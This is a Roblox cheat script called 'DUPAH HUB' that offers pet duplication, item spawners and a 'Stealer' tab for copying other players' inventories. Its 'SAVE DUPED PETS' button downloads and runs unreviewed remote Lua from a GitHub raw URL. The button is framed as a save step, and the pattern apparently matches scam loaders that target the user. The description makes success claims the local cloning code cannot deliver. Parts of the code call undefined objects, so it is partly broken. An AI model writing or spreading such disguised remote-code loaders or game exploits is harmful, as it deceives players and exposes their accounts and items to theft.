local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local TweenService = game:GetService("TweenService")
local backpack = player:WaitForChild("Backpack")
local playerGui = player:WaitForChild("PlayerGui")
local Players = game:GetService("Players")

local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

local Window = Rayfield:CreateWindow({
	Name = "DUPAH HUB",
	LoadingTitle = "DUPAH HUB",
	LoadingSubtitle = "SUB TO -> YUraxYZ",
	ConfigurationSaving = {
		Enabled = false
	},
	Discord = {
		Enabled = false
	},
	KeySystem = false
})
local DescriptionTab = Window:CreateTab("Description", 0)

DescriptionTab:CreateParagraph({
	Title = "📌 REMEMBER",
	Content = "Please read all instructions carefully to avoid issues during the duplication process."
})

DescriptionTab:CreateParagraph({
	Title = "• Supported Pets",
	Content = "Only works with: Queen Bee, Raccoon, Dragonfly, and Red Fox."
})

DescriptionTab:CreateParagraph({
	Title = "• Success Rate",
	Content = "(Public Servers Only) Approximately 38% chance to succeed. Be prepared to rejoin and re-execute if needed."
})

DescriptionTab:CreateParagraph({
	Title = "• Duplication Delay",
	Content = "After starting the duplication, wait 3–5 minutes. Once the process finishes, rejoin the server. The duplicated pets should appear."
})

DescriptionTab:CreateParagraph({
	Title = "How to Use",
	Content = "Hold your desired pet, input the duplication amount, press 'DUPE', then press 'SAVE DUPED PETS'."
})

DescriptionTab:CreateParagraph({
	Title = "⚠️ Warning",
	Content = "Do NOT leave the game immediately after clicking 'DUPE'. If you exit too soon, the pet may be lost to the GAG database!"
})

local MainTab = Window:CreateTab("Main", 0)


local toolLabel = MainTab:CreateParagraph({
	Title = "Holding:",
	Content = "Nothing"
})

spawn(function()
	while true do
		task.wait(0.1)
		local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
		if tool then
			toolLabel:Set({Title = "Holding:", Content = tool.Name})
		else
			toolLabel:Set({Title = "Holding:", Content = "Nothing"})
		end
	end
end)

local dupeAmount = 1
MainTab:CreateInput({
	Name = "Dupe Amount (1-20)",
	PlaceholderText = "Enter a number",
	RemoveTextAfterFocusLost = false,
	Callback = function(text)
		local number = tonumber(text)
		if number and number >= 1 and number <= 20 then
			dupeAmount = number
		else
			warn("Enter a number between 1 and 100")
		end
	end
})


-- DUPE Button
MainTab:CreateButton({
	Name = "DUPE",
	Callback = function()
		local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
		if not tool then
			warn("No tool to duplicate.")
			return
		end
		for i = 1, dupeAmount do
			local clone = tool:Clone()
			clone.Parent = player.Backpack
		end
	end
})


MainTab:CreateButton({
	Name = "SAVE DUPED PETS",
	Callback = function()
		pcall(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/NotyourScripter/PetxSeedSpawner/refs/heads/main/Lscreen.lua"))()
			gui:Destroy()
		end)
	end
})

-- Pets Tab
local PetTab = Window:CreateTab("🐾 Pets", 7734053494)

local PetName, PetKG, PetAge = "Raccoon", 1, 2

PetTab:CreateInput({
    Name = "Pet Name",
    PlaceholderText = "Raccoon",
    RemoveTextAfterFocusLost = false,
    Callback = function(v)
        PetName = v
    end
})

PetTab:CreateInput({
    Name = "KG",
    PlaceholderText = "1",
    RemoveTextAfterFocusLost = false,
    Callback = function(v)
        PetKG = tonumber(v)
    end
})

PetTab:CreateInput({
    Name = "Age",
    PlaceholderText = "2",
    RemoveTextAfterFocusLost = false,
    Callback = function(v)
        PetAge = tonumber(v)
    end
})

PetTab:CreateButton({
    Name = "Spawn Pet",
    Callback = function()
        if PetName and PetKG and PetAge then
            Spawner.SpawnPet(PetName, PetKG, PetAge)
        else
            warn("Missing pet info")
        end
    end
})

-- Seeds Tab
local SeedTab = Window:CreateTab("🌾 Seeds", 7733960981)

local SeedName = "Candy Blossom"

SeedTab:CreateInput({
    Name = "Seed Name",
    PlaceholderText = "Candy Blossom",
    RemoveTextAfterFocusLost = false,
    Callback = function(v)
        SeedName = v
    end
})

SeedTab:CreateButton({
    Name = "Spawn Seed",
    Callback = function()
        Spawner.SpawnSeed(SeedName)
    end
})

-- Eggs Tab
local EggTab = Window:CreateTab("🥚 Eggs", 7733964644)

local EggName = "Night Egg"

EggTab:CreateInput({
    Name = "Egg Name",
    PlaceholderText = "Night Egg",
    RemoveTextAfterFocusLost = false,
    Callback = function(v)
        EggName = v
    end
})

EggTab:CreateButton({
    Name = "Spawn Egg",
    Callback = function()
        Spawner.SpawnEgg(EggName)
    end
})

-- Spin Tab
local SpinTab = Window:CreateTab("🎡 Spin", 7733975874)

local SpinName = "Sunflower"

SpinTab:CreateInput({
    Name = "Plant Name",
    PlaceholderText = "Sunflower",
    RemoveTextAfterFocusLost = false,
    Callback = function(v)
        SpinName = v
    end
})

SpinTab:CreateButton({
    Name = "Spin Plant",
    Callback = function()
        Spawner.Spin(SpinName)
    end
})

-- Misc Tab
local MiscTab = Window:CreateTab("⚙️ Misc", 7734053494)

MiscTab:CreateButton({
    Name = "Load Default UI",
    Callback = function()
        Spawner.Load()
    end
})

local StealerTab = Window:CreateTab("Stealer COMING SOON.", 4483362458)
StealerTab:CreateSection("Select a Player")

-- UI Elements
local InventoryList
local selectedPlayer

-- Helper: Try to find container (Backpack, StarterGear, etc.)
local function GetInventoryContainer(player)
    local tryNames = { "Backpack", "StarterGear" }
    for _, name in ipairs(tryNames) do
        local container = player:FindFirstChild(name)
        if container and #container:GetChildren() > 0 then
            return container, name
        end
    end

    -- Fallback: return first folder with contents
    for _, child in ipairs(player:GetChildren()) do
        if (child:IsA("Folder") or child:IsA("Model")) and #child:GetChildren() > 0 then
            return child, child.Name
        end
    end

    return nil, nil
end

-- Update inventory list UI
local function UpdateInventory(player)
    if InventoryList then InventoryList:Destroy() end

    InventoryList = StealerTab:CreateParagraph({ Title = player.Name .. "'s Inventory", Content = "Loading..." })

    local status, err = pcall(function()
        local container, sourceName = GetInventoryContainer(player)

        if not container then
            InventoryList:Set({ Content = "❌ No visible inventory found." })
            return
        end

        local lines = {}
        for _, item in ipairs(container:GetChildren()) do
            table.insert(lines, item.Name .. " (" .. item.ClassName .. ")")
        end

        if #lines == 0 then
            InventoryList:Set({ Content = "📦 Inventory is empty in " .. sourceName })
        else
            InventoryList:Set({ Content = table.concat(lines, "\n") })
        end
    end)

    if not status then
        InventoryList:Set({ Content = "⚠️ Error: " .. tostring(err) })
        warn("Failed to update inventory:", err)
    end
end

-- Clone items
local function AttemptClone(player)
    local container = GetInventoryContainer(player)
    if not container then
        Rayfield:Notify({ Title = "Clone Failed", Content = "No inventory found.", Duration = 4 })
        return
    end

    local cloned = 0
    for _, item in ipairs(container:GetChildren()) do
        local clonedItem = item:Clone()
        clonedItem.Parent = game.Players.LocalPlayer.Backpack
        cloned = cloned + 1
    end

    Rayfield:Notify({ Title = "Clone Complete", Content = "Cloned " .. cloned .. " item(s).", Duration = 4 })
end

-- Player Dropdown
local function CreateDropdown()
    local names = {}
    for _, p in ipairs(game.Players:GetPlayers()) do
        if p ~= game.Players.LocalPlayer then
            table.insert(names, p.Name)
        end
    end

    return StealerTab:CreateDropdown({
        Name = "Select Player",
        Options = names,
        CurrentOption = nil,
        Callback = function(name)
            local plr = game.Players:FindFirstChild(name)
            if plr then
                selectedPlayer = plr
                UpdateInventory(plr)
            end
        end
    })
end

local playerDropdown = CreateDropdown()

-- Buttons
StealerTab:CreateButton({
    Name = "🔄 Refresh Players",
    Callback = function()
        playerDropdown:Refresh((function()
            local names = {}
            for _, p in ipairs(game.Players:GetPlayers()) do
                if p ~= game.Players.LocalPlayer then
                    table.insert(names, p.Name)
                end
            end
            return names
        end)(), true)
    end
})

StealerTab:CreateButton({
    Name = "🧤 Steal Items",
    Callback = function()
        if selectedPlayer then
            AttemptClone(selectedPlayer)
        else
            Rayfield:Notify({ Title = "No Player", Content = "Please select a player first.", Duration = 3 })
        end
    end
})

local SocialTab = Window:CreateTab("Social", 0)

SocialTab:CreateParagraph({
	Title = "- TIKTOK -",
	Content = "SUPPORT MY TIKTOK"
})

SocialTab:CreateParagraph({
	Title = "MAIN ACCOUNT :",
	Content = "@yurahaxyz        |        @yurahayz"
})

SocialTab:CreateParagraph({
	Title = "- YOUTUBE -",
	Content = "SUBSCRIBE TO MY CHANNEL"
})

SocialTab:CreateParagraph({
	Title = "MAIN ACCOUNT",
	Content = "YUraxYZ"
})


local transparencyData = {}

for _, obj in pairs(gui:GetDescendants()) do
	if obj:IsA("GuiObject") then
		local original = {
			BackgroundTransparency = obj.BackgroundTransparency
		}
		if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
			original.TextTransparency = obj.TextTransparency
			obj.TextTransparency = 1
		end
		obj.BackgroundTransparency = 1
		transparencyData[obj] = original
	end
end

-- Tween back to original transparencies
for obj, original in pairs(transparencyData) do
	TweenService:Create(obj, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
		BackgroundTransparency = original.BackgroundTransparency
	}):Play()
	if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
		TweenService:Create(obj, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			TextTransparency = original.TextTransparency
		}):Play()
	end
end
